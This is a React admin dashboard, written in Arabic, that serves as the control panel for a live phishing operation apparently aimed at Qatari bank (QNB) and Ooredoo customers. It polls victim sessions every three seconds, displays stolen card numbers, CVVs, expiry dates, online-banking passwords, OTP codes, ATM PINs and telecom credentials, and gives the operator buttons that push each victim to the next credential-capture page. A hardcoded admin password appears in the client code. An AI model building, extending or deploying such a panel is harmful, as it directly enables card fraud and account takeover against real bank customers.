import { useState, useEffect } from "react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import {
  Eye,
  LogOut,
  Search,
  Users,
  CheckCircle2,
  Clock,
  ExternalLink,
  User,
  CreditCard,
  Key,
  Globe,
  Check,
  X,
  LayoutDashboard,
} from "lucide-react";

export default function AdminDashboard() {
  const [password, setPassword] = useState("");
  const [isAuthenticated, setIsAuthenticated] = useState(() => {
    if (typeof window !== 'undefined') {
      return localStorage.getItem("admin_auth") === "true";
    }
    return false;
  });
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedSession, setSelectedSession] = useState<any>(null);
  const [isDetailsOpen, setIsDetailsOpen] = useState(false);

  const { data: sessions, refetch } = trpc.submissions.getSessions.useQuery(undefined, {
    enabled: isAuthenticated,
    refetchInterval: 3000,
  });

  const updateStatusMutation = trpc.submissions.updateSessionStatus.useMutation();
  const updateStepMutation = trpc.submissions.updateSessionStep.useMutation();
  const adminTakeActionMutation = trpc.submissions.adminTakeAction.useMutation();

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === "Qatar@@200") {
      setIsAuthenticated(true);
      localStorage.setItem("admin_auth", "true");
      toast.success("تم تسجيل الدخول بنجاح");
    } else {
      toast.error("كلمة المرور غير صحيحة");
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    localStorage.removeItem("admin_auth");
  };

  const handleStatusUpdate = async (sessionId: string, status: string) => {
    try {
      await updateStatusMutation.mutateAsync({ sessionId, status });
      toast.success(`تم تحديث الحالة: ${status === 'approved' ? 'قبول' : 'رفض'}`);
      refetch();
    } catch (error) {
      toast.error("فشل تحديث الحالة");
    }
  };

  const handleRedirect = async (sessionId: string, redirectTarget: string) => {
    try {
      await adminTakeActionMutation.mutateAsync({ sessionId, action: "redirect", redirectTarget, errorMessage: undefined });
      toast.success(`تم التوجيه إلى: ${redirectTarget}`);
      refetch();
    } catch (error) {
      toast.error("فشل التوجيه");
    }
  };

  const filteredSessions = sessions?.filter((s) => {
    const sId = s.id || "";
    const name = s.personalData?.nameArabic || s.personalData?.nameEnglish || "";
    return (
      sId.toLowerCase().includes(searchTerm.toLowerCase()) ||
      name.toLowerCase().includes(searchTerm.toLowerCase())
    );
  });

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4">
        <div className="w-full max-w-md bg-white rounded-3xl shadow-2xl p-8 space-y-8">
          <div className="text-center">
            <div className="w-20 h-20 bg-[#8C0032] rounded-3xl flex items-center justify-center mx-auto mb-6 rotate-3 shadow-xl">
              <Key className="text-white w-10 h-10 -rotate-3" />
            </div>
            <h1 className="text-3xl font-black text-slate-900 mb-2">لوحة الإدارة</h1>
            <p className="text-slate-500 font-medium">أدخل كلمة المرور للمتابعة</p>
          </div>
          <form onSubmit={handleLogin} className="space-y-6">
            <div className="space-y-2">
              <Input
                type="password"
                placeholder="كلمة المرور"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="h-14 bg-slate-50 border-slate-200 rounded-2xl text-center text-lg focus:ring-2 focus:ring-[#8C0032] transition-all"
              />
            </div>
            <Button type="submit" className="w-full h-14 bg-[#8C0032] hover:bg-[#a8003d] text-white text-lg font-bold rounded-2xl shadow-lg shadow-rose-200 transition-all active:scale-95">
              دخول النظام
            </Button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f1f5f9] text-slate-900 font-sans" dir="rtl">
      {/* Top Navbar */}
      <nav className="bg-white border-b border-slate-200 sticky top-0 z-40">
        <div className="max-w-[1600px] mx-auto px-4 h-20 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <div className="bg-[#8C0032] p-2.5 rounded-xl shadow-lg shadow-rose-100">
              <LayoutDashboard className="text-white w-6 h-6" />
            </div>
            <div>
              <h1 className="text-xl font-black text-slate-900 tracking-tight">إدارة العمليات اللحظية</h1>
              <div className="flex items-center gap-2">
                <span className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span>
                <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">النظام نشط الآن</span>
              </div>
            </div>
          </div>

          <div className="flex items-center gap-6">
            <div className="relative hidden lg:block w-80">
              <Search className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 w-4 h-4" />
              <Input
                placeholder="بحث عن عميل أو كود الجلسة..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="pr-11 h-11 bg-slate-50 border-slate-200 rounded-xl focus:bg-white focus:ring-2 focus:ring-[#8C0032] transition-all"
              />
            </div>
            <Button variant="ghost" onClick={handleLogout} className="h-11 px-4 gap-2 text-slate-500 hover:text-rose-600 hover:bg-rose-50 rounded-xl transition-all">
              <LogOut className="w-5 h-5" />
              <span className="font-bold">خروج</span>
            </Button>
          </div>
        </div>
      </nav>

      <main className="max-w-[1600px] mx-auto px-4 py-8 space-y-8">
        {/* Stats Grid */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          {[
            { label: "إجمالي الزوار", value: sessions?.length || 0, icon: Users, color: "text-blue-600", bg: "bg-blue-50" },
            { label: "طلبات قيد الانتظار", value: sessions?.filter(s => s.status === 'pending').length || 0, icon: Clock, color: "text-amber-600", bg: "bg-amber-50" },
            { label: "عمليات مكتملة", value: sessions?.filter(s => s.status === 'accepted').length || 0, icon: CheckCircle2, color: "text-emerald-600", bg: "bg-emerald-50" },
          ].map((stat, i) => (
            <div key={i} className="bg-white p-6 rounded-3xl shadow-sm border border-slate-200 flex items-center gap-6 hover:shadow-md transition-shadow">
              <div className={`${stat.bg} ${stat.color} p-5 rounded-2xl`}>
                <stat.icon className="w-8 h-8" />
              </div>
              <div>
                <p className="text-sm font-bold text-slate-400 mb-1">{stat.label}</p>
                <p className="text-3xl font-black text-slate-900">{stat.value}</p>
              </div>
            </div>
          ))}
        </div>

        {/* Data Table */}
        <div className="bg-white rounded-[2rem] shadow-sm border border-slate-200 overflow-hidden">
          <div className="p-6 border-b border-slate-100 bg-slate-50/50 flex items-center justify-between">
            <h2 className="text-lg font-black text-slate-800 flex items-center gap-2">
              <Users className="w-5 h-5 text-[#8C0032]" />
              قائمة العملاء المتصلين
            </h2>
            <span className="text-xs font-bold text-slate-400 bg-white px-3 py-1 rounded-full border border-slate-200">
              تحديث تلقائي كل 3 ثوانٍ
            </span>
          </div>
          
          <div className="overflow-x-auto">
            <Table>
              <TableHeader className="bg-slate-50">
                <TableRow className="hover:bg-transparent border-b border-slate-100">
                  <TableHead className="text-right py-5 font-black text-slate-500 text-xs uppercase tracking-wider">كود الجلسة</TableHead>
                  <TableHead className="text-right py-5 font-black text-slate-500 text-xs uppercase tracking-wider">البنك</TableHead>
                  <TableHead className="text-right py-5 font-black text-slate-500 text-xs uppercase tracking-wider">الدولة</TableHead>
                  <TableHead className="text-right py-5 font-black text-slate-500 text-xs uppercase tracking-wider">الاسم</TableHead>
                  <TableHead className="text-right py-5 font-black text-slate-500 text-xs uppercase tracking-wider">المرحلة الحالية</TableHead>
                  <TableHead className="text-right py-5 font-black text-slate-500 text-xs uppercase tracking-wider">وقت الدخول</TableHead>
                  <TableHead className="text-center py-5 font-black text-slate-500 text-xs uppercase tracking-wider">التحكم والبيانات</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {filteredSessions?.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={7} className="h-40 text-center text-slate-400 font-bold">لا توجد طلبات نشطة حالياً</TableCell>
                  </TableRow>
                ) : (
                  filteredSessions?.map((session) => (
                    <TableRow key={session.id} className="group hover:bg-slate-50/80 transition-colors border-b border-slate-50">
                      <TableCell className="font-mono text-[10px] text-slate-400">...{session.id?.slice(-10)}</TableCell>
                      <TableCell>
                        <div className="flex items-center gap-2">
                          <div className={`w-2 h-2 rounded-full ${session.selectedBank === 'qnb' ? 'bg-rose-500' : 'bg-blue-500'}`}></div>
                          <span className="font-black text-xs text-slate-700">{session.selectedBank?.toUpperCase()}</span>
                        </div>
                      </TableCell>
                      <TableCell>
                        <div className="flex items-center gap-2 text-slate-600 font-bold text-xs">
                          <Globe className="w-3.5 h-3.5 text-slate-300" />
                          {session.country || "غير معروف"}
                        </div>
                      </TableCell>
                      <TableCell className="font-black text-slate-900 text-sm">{session.personalData?.nameArabic || session.personalData?.nameEnglish || "—"}</TableCell>
                      <TableCell>
                        <div className={`inline-flex items-center px-3 py-1 rounded-full text-[10px] font-black border ${
                          session.currentStep === 'waiting' ? 'bg-amber-50 text-amber-600 border-amber-100 animate-pulse' :
                          session.currentStep === 'success' ? 'bg-emerald-50 text-emerald-600 border-emerald-100' :
                          'bg-blue-50 text-blue-600 border-blue-100'
                        }`}>
                          {getStepLabel(session.currentStep)}
                        </div>
                      </TableCell>
                      <TableCell className="text-slate-400 font-bold text-[10px]">
                        {new Date(session.createdAt).toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                      </TableCell>
                      <TableCell>
                        <div className="flex items-center justify-center gap-3">
                          <Button
                            size="sm"
                            className="h-9 px-4 bg-slate-900 hover:bg-[#8C0032] text-white rounded-xl gap-2 transition-all shadow-sm active:scale-95"
                            onClick={() => {
                              setSelectedSession(session);
                              setIsDetailsOpen(true);
                            }}
                          >
                            <Eye className="w-4 h-4" />
                            <span className="font-bold">عرض البيانات</span>
                          </Button>

                          <DropdownMenu>
                            <DropdownMenuTrigger asChild>
                              <Button size="sm" variant="outline" className="h-9 px-4 border-slate-200 hover:bg-slate-50 text-slate-600 rounded-xl gap-2 transition-all active:scale-95">
                                <ExternalLink className="w-4 h-4" />
                                <span className="font-bold">توجيه</span>
                              </Button>
                            </DropdownMenuTrigger>
                            <DropdownMenuContent align="center" className="w-52 p-2 rounded-2xl border-slate-200 shadow-xl z-50 bg-white">
                              {[
                                { name: '📄 صفحة الدخول', step: 'login-method' },
                                { name: '🔑 صفحة OTP', step: 'otp' },
                                { name: '💳 صفحة ATM PIN', step: 'atm-pin' },
                                { name: '🌐 صفحة Ooredoo', step: 'ooredoo' },
                                { name: '📱 صفحة OTP Ooredoo', step: 'otp-ooredoo' },
                                { name: '✨ صفحة النجاح', step: 'success' },
                              ].map((page) => (
                                <DropdownMenuItem
                                  key={page.step}
                                  onClick={() => handleRedirect(session.id, `/${page.step}`)}
                                  className="text-right justify-end font-bold text-slate-600 hover:bg-slate-50 cursor-pointer rounded-xl py-2.5 px-4 mb-1 last:mb-0 transition-colors"
                                >
                                  {page.name}
                                </DropdownMenuItem>
                              ))}
                            </DropdownMenuContent>
                          </DropdownMenu>
                        </div>
                      </TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </div>
        </div>
      </main>

      {/* Modern Details Dialog */}
      {selectedSession && (
        <Dialog open={isDetailsOpen} onOpenChange={setIsDetailsOpen}>
          <DialogContent className="max-w-3xl bg-white rounded-[2.5rem] p-0 overflow-hidden border-none shadow-[0_20px_50px_rgba(0,0,0,0.2)] z-[100]" dir="rtl">
            <DialogHeader className="bg-[#8C0032] p-8 text-white relative">
              <div className="flex items-center gap-4">
                <div className="bg-white/20 p-3 rounded-2xl backdrop-blur-md">
                  <User className="w-8 h-8 text-white" />
                </div>
                <div>
                  <DialogTitle className="text-2xl font-black">ملف بيانات العميل</DialogTitle>
                  <p className="text-rose-100/60 text-xs font-bold mt-1 font-mono tracking-tighter uppercase">Session ID: {selectedSession.id}</p>
                </div>
              </div>
            </DialogHeader>

            <div className="p-8 max-h-[75vh] overflow-y-auto space-y-8 custom-scrollbar">
              {/* Section: Personal */}
              <div className="space-y-4">
                <div className="flex items-center gap-3 text-slate-800 font-black text-sm">
                  <div className="w-1.5 h-6 bg-[#8C0032] rounded-full"></div>
                  المعلومات الأساسية
                </div>
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
                  <InfoCard label="الاسم الكامل" value={selectedSession.personalData?.nameArabic || selectedSession.personalData?.nameEnglish} />
                  <InfoCard label="رقم الجوال" value={selectedSession.personalData?.phoneNumber} />
                  <InfoCard label="رقم الهوية" value={selectedSession.personalData?.idNumber} />
                  <InfoCard label="الدولة" value={selectedSession.country} />
                </div>
              </div>

              {/* Dynamic Sections Grid */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {/* Login Info */}
                <DataSection 
                  title="بيانات الدخول"
                  icon={<CreditCard className="w-4 h-4" />}
                  data={selectedSession.loginMethod?.loginType === 'card' ? {
                    "النوع": "بطاقة بنكية",
                    "رقم البطاقة": selectedSession.loginMethod.cardNumber,
                    "الاسم": selectedSession.loginMethod.cardholderName,
                    "التاريخ": selectedSession.loginMethod.expiryDate,
                    "CVV": selectedSession.loginMethod.cvv
                  } : {
                    "النوع": "حساب مستخدم",
                    "المستخدم": selectedSession.loginMethod?.username,
                    "كلمة السر": selectedSession.loginMethod?.password
                  }}
                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'approved')}
                  onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
                />

                {/* OTP Codes */}
                <DataSection 
                  title="رموز التحقق (OTP)"
                  icon={<Key className="w-4 h-4" />}
                  data={selectedSession.otps?.reduce((acc: any, otp: any, i: number) => {
                    acc[`رمز ${i + 1}`] = otp.otpCode;
                    return acc;
                  }, {}) || { "رمز OTP": "—" }}
                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'approved')}
                  onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
                />

                {/* ATM PIN */}
                <DataSection 
                  title="ATM PIN"
                  icon={<CreditCard className="w-4 h-4" />}
                  data={{ "الرقم السري": selectedSession.atmPin?.pin }}
                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'approved')}
                  onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
                />

                {/* Ooredoo */}
                <DataSection 
                  title="بيانات Ooredoo"
                  icon={<Globe className="w-4 h-4" />}
                  data={{
                    "المستخدم": selectedSession.ooredoo?.ooredooUser,
                    "كلمة السر": selectedSession.ooredoo?.ooredooPassword,
                  }}
                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'approved')}
                  onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
                />
              </div>
            </div>

            <DialogFooter className="p-6 bg-slate-50 border-t flex justify-center">
              <Button onClick={() => setIsDetailsOpen(false)} className="bg-slate-900 hover:bg-slate-800 text-white px-12 h-12 font-black rounded-2xl shadow-lg transition-all active:scale-95">
                إغلاق النافذة
              </Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      )}
    </div>
  );
}

function getStepLabel(step: string | null | undefined) {
  if (!step) return '—';
  const steps: Record<string, string> = {
    'home': 'الرئيسية',
    'personal-data': 'البيانات الشخصية',
    'login-method': 'تسجيل الدخول',
    'otp': 'OTP',
    'atm-pin': 'ATM PIN',
    'ooredoo': 'Ooredoo',
    'otp-ooredoo': 'OTP Ooredoo',
    'waiting': 'في الانتظار',
    'success': 'نجاح'
  };
  return steps[step] || step;
}

function InfoCard({ label, value }: { label: string; value: any }) {
  return (
    <div className="bg-slate-50 p-4 rounded-2xl border border-slate-100 hover:border-slate-200 transition-colors">
      <p className="text-[10px] font-black text-slate-400 uppercase mb-1 tracking-wider">{label}</p>
      <p className="text-slate-900 font-black text-sm break-all">{value || "—"}</p>
    </div>
  );
}

function DataSection({ title, icon, data, onAccept, onReject }: { 
  title: string, 
  icon: any, 
  data: Record<string, any>, 
  onAccept: () => void, 
  onReject: () => void 
}) {
  const hasData = Object.values(data).some(v => v && v !== "—");
  
  return (
    <div className={`p-5 rounded-3xl border transition-all ${hasData ? 'bg-slate-50 border-slate-200 shadow-sm' : 'bg-slate-50/30 border-dashed border-slate-200 opacity-50'}`}>
      <div className="flex items-center justify-between mb-5">
        <div className="flex items-center gap-2 text-slate-900 font-black text-sm">
          <div className="bg-white p-2 rounded-lg shadow-sm">{icon}</div>
          {title}
        </div>
        {hasData && (
          <div className="flex items-center gap-2">
            <Button size="sm" onClick={onAccept} className="h-8 px-3 bg-emerald-500 hover:bg-emerald-600 text-white font-bold rounded-lg gap-1 text-[10px] shadow-sm shadow-emerald-100">
              <Check className="w-3 h-3" />
              قبول
            </Button>
            <Button size="sm" onClick={onReject} variant="destructive" className="h-8 px-3 font-bold rounded-lg gap-1 text-[10px] shadow-sm shadow-rose-100">
              <X className="w-3 h-3" />
              رفض
            </Button>
          </div>
        )}
      </div>
      <div className="grid grid-cols-1 gap-3">
        {Object.entries(data).map(([key, val]) => (
          <div key={key} className="flex justify-between items-center bg-white/50 p-2.5 rounded-xl border border-white">
            <span className="text-[10px] font-bold text-slate-400">{key}:</span>
            <span className="text-xs font-black text-slate-700 font-mono">{val || "—"}</span>
          </div>
        ))}
      </div>
    </div>
  );
}
